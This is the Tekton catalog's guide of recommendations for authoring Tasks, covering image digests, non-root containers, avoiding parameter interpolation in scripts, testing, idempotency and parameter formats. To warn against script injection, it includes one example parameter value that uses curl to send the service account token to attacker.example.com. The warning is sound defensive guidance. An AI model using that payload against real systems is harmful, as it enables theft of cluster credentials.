# Task Authoring Recommendations

This is a collection of recommendations for developers authoring Tasks, with
justifications for why they are recommended.

These are just _recommendations_, and there may be situations where the
recommendation cannot or should not be followed.

This is a living document. Recommendations may be added in the future, or
existing recommendations may change or be clarified.

If you have a question or would like to add a recommendation, please [file an
issue](https://github.com/tektoncd/catalog/issues/new).

## Reference Images by Digest

Where possible, an image used in a step should be referenced by digest (i.e.,
`busybox@sha256:abcde...`) instead of by tag (`busybox:latest`). This ties the
Task to the exact specific version of the image, and prevents unexpected
changes.

Referencing by tag (`:latest` or `:v1.2.3`) means that an owner of that image
can push a new image to that tag, and all Tasks that reference the image by
that tag will start using it immediately. This can lead to unexpected Task
failures, or silent behavior changes, including security-sensitive changes.

## Run as non root and non privileged

One of the security best practices of containers is to run them as a
non-root user. Usually this is achieved by having a user defined in
your image and having it referred in your image configuration. You can
see
[here](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)
for details on best practice with `Dockerfile`s.

You should also avoid as much as possible to run containers as
[privileged](https://stackoverflow.com/questions/36425230/privileged-containers-and-capabilities).

> The --privileged flag gives all capabilities to the container, and
> it also lifts all the limitations enforced by the device cgroup
> controller. In other words, the container can then do almost
> everything that the host can do. This flag exists to allow special
> use-cases, like running Docker within Docker.

On the catalog, this means that you should, where possible:
- **ensure the image you are using can run as non-root** ; any step
  that do not specify explicitly that it needs to be run as root
  should work when running as a user.
- if your step really need to be run as root, specify it in the task
  using
  [`securityContext`](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/),
  same applies for `privileged`.

  ```yaml
  # […]
    steps:
    - name: foo
      image: myimage
      securityContext:
        runAsUser: 0 # root uid == 0
        privileged: true
  ```

## Be as portable and compatible as possible

Make use of recent Kubernetes and Tekton features only when a user
will expect it from the task's purpose. Your task may be of great use
to users that have good reason not to upgrade right now. Your task
should include the `tekton.dev/pipelines.minVersion`.

## Remember that there are other languages than sh and bash

Yes, sh and bash are DSLs for running processes, but sometimes there
are other languages more suited for what you're trying to do.  Tekton
Pipelines' main positive attribute is the ability to have the right
tool available for every step, including the _interpreter_.
Use python or another scripting languages when that is warranted.

A python example:

```
  steps:
    - name: foo
      image: python:alpine
      script: |
        #!/bin/env python
        import os
        print(os.getenv('PARAM_ONE'))
```

## Don't use interpolation in scripts or string arguments

Using `$(tekton.task)` interpolation in the `script` or as a `sh -c`
string is extremely fragile.  The interpolation done by tekton is not
aware of the context in which the interpolation happens.  A space, a
quote sign, a backslash or newline could easily thwart an otherwise
beautiful script.

```
  steps:
  - name: foo
    image: myimage
    script: |
      echo $(params.one)
```

If `params.one` happens to contain a quote, then the resulting shell
script might look like this:

```
echo '
```

This script is not valid, and the task will fail:

```
sh: 1: Syntax error: Unterminated quoted string
```

This goes for standard shell scripts, python scripts or any other
script where tekton ends up interpolating variables.  Different
languages have different quoting rules in different contexts, but a
maliciously formed parameter would be able to break out of any
quoting.

No amount of escaping will be air-tight.  Even python `"""` strings.
A maliciously formed parameter just needs to include another `"""` to
close the string:

```
    script: |
      #!/bin/env python
      value = """$(params.one)"""
      print(value)
```

If the parameter has the value `"""` followed by a line break, then
the anything after the parameter's newline will be interpreted as
**python code**, probably causing the script to fail, or worse.

Instead, use environment variables or arguments, which are not
interpolated into the script source code:

```
  steps:
  - name: foo
    image: myimage
    env:
      - name: PARAM_ONE
        value: $(params.one)
    args:
      - $(params.one)
    script: |
      echo "$PARAM_ONE"
      echo "$1"
```

The script will now correctly print out the value of params.one,
regardless of what it contains; both environment variables and
arguments.

It is worth mentioning that an interpolated script (i.e. one that has
`$(params.values)` in it) is a security problem.  If an attacker is
able to send in a parameter value that looks something like `$(curl -s
http://attacker.example.com/?value=$(cat
/var/run/secrets/kubernetes.io/serviceaccount/token))`, then the
attacker would be able to exfiltrate the service account token for the
TaskRun.

## Extract task code (scripts) to their own files

As a task grows in complexity, it becomes harder and harder to
maintain it in-line.  Because you have already avoided interpolation
in the script, there is no real need for the script to be in-lined
into the Task.

As with all configuration and code that you write as part of software
development, it is important to treat the Tasks and embedded scripts
with the same care you use for your other code.

Scripts should be maintained such that they can be versioned and tested;
therefore as a script grows beyond a few simple lines, you should store
the script in version control, and use tests and code review to maintain
it over time. At this point you may want to consider switching from a
language which does not naturally support tasking, such as bash, to one
that does, such as Python.

At this point, the best option we have to offer is to build and publish
an image which contains your tested, versioned script, and use that image
from within your Task. This may seem like a big ask, but another way of
looking at it is that your script has graduated from just being a script
to being a tool.

## Test and verify your task code

Use sound engineering principles when building Tekton Task code.
Since the code can reside in external files, it's possible to split
them up and have test harnesses that test various code paths.  Have a
build system that runs the task's test harness whenever you make
changes to them before you commit, and of course a Tekton Pipeline to
verify that your tests are passing before merging.

## Create idempotent tasks and pipelines

When you design tasks and pipelines, they should, as much as possible
be written in an idempotent manner.  Idempotency means that it is safe
to re-execute, and this can be used to your advantage.  If designed
properly, it can also allow you to skip work that has already happened
(see level-based approach).

## Clearly define the format of input parameters and results

Specify the format when defining parameters and results, even down to
trailing whitespace.  Specify the intention behind them.  For
parameters, indicate if there are other tasks that might have an output
that matches.  For a result, indicate where you might use the result.

This is especially important when building tasks that may be composed
in different ways, and where the results of some tasks are intended to
be the parameters to other tasks.

## Use composable parameter formats

Especially when passing lists of items between tasks (i.e. a list of
items from one task, designed to be the parameter of another task),
avoid using structured strings, tab-separated values, or even
line-separated values.  Such formats are prone to error due to simple
whitespace mistakes, or a rogue value that contains a hard-to-detect
newline.

Instead use a more structured data format like e.g. a json stream or
more formally [JSON Text Sequences RFC
7464](https://tools.ietf.org/html/rfc7464), and use jq to process the
different _records_ that are passed in to a task.  This ensures you
can pass almost any conceivable type of data without any escaping
issues.

```
# task foo
  steps:
  - name: foo
    image: myimage
    script: |
      echo '{"value": 123}' >> $(results.data.path)

# task other
  steps:
  - name: bar
    image: myimage
    script: |
      printf '{"size": "large"}' >> $(results.data.path)
      printf '{"size": "small", "fake": true}' >> $(results.data.path)

# pipeline
  - name: example
    taskRef:
      kind: Task
      name: pipeline
    params:
    - name: data
      value: |
        $(tasks.foo.results.data)
        $(tasks.bar.results.data)
```

Here, the "foo" and "bar" task results and the "data" parameter of the
pipeline have been defined to be _of type JSON Stream_, allowing the
pipeline author to construct the pipeline parameter value directly by
concatenating the results.  This construct does not fall apart when
the data is on one line or split on multiple lines.

## Use "level-based" approach to your advantage

If you have a task that creates another pipelinerun in order to
complete its work, you should leverage the fact that `kubectl apply`
has "create-or-update" semantics.  If you _apply_ a pipelinerun that
already exists, it means that you don't need to rerun the pipeline.

For example, if you have a task that takes a commit as a parameter,
say `abc123def`, and its job is to create a pipelinerun with that
commit as a parameter (and the other pipeline is idempotent, and does
not need to be re-run for the same commit), then you could _apply_ the
pipelinerun `run-abc123def`.  The first time, `run-abc123def` won't
exist, and a PipelineRun will be created, running the pipeline.  If,
at a later point in time, the task happens to be run with the same
commit, it will again _apply_ the pipelinerun `run-abc123def`.  Since
it already exists, nothing happens.

This technique can be used to "short circuit" work when it is not
necessary to _re-run_.

## Provide "tekton.dev/platforms" annotation

`tekton.dev/platforms` annotation indicates on which platforms (for
instance, "linux/amd64,linux/arm64" or "windows/amd64") resource can
be run.
The most reliable option to verify the platform list is to run the
e2e tests provided with the resource. Minimal requirement is to use
the container image, which has support for corresponding platform.

Add `Platforms` section into the README.md of the corresponding resource.
If running of the resource on specific platform requires to use another
image or do other customization, it should be also mentioned in the section.

If you don't know, which platforms to specify, good start is to use
"linux/amd64", as it is most popular platform and most likely the tests,
you've done, were on top of it.
